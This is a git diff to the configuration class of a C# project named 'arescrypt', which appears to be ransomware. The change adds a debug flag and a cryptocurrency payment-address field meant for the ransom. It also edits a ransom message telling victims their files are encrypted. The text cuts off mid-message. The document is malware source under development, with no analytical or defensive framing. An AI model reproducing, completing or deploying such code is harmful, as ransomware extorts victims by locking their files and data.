@@ -5,13 +5,18 @@ namespace arescrypt
 {
     class Configuration
     {
+
         public static string currentWorkingDirectory = System.IO.Path.GetDirectoryName(
             System.Reflection.Assembly.GetExecutingAssembly().Location);
 
-        public static bool sandBox = true; // Safemode for testing/debugging
-        public static string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
+        // Debugging configuration
+        public bool sandBox = true; // Safemode for testing/debugging
+        public string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
+        public bool debugMode = true; // Debug mode will enable/disable display of the Debug Console/GUI
 
-        public static string customDisplayMessage =
+        // Application configuration
+        public string cryptoAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"; // insert Bitcoin/Litecoin/Zcash address here
+        public string customDisplayMessage =
 @"What happened to your computer?
 Your important file are encrypted!
 Many of your documents, photos, videos, databases and others files are no longer
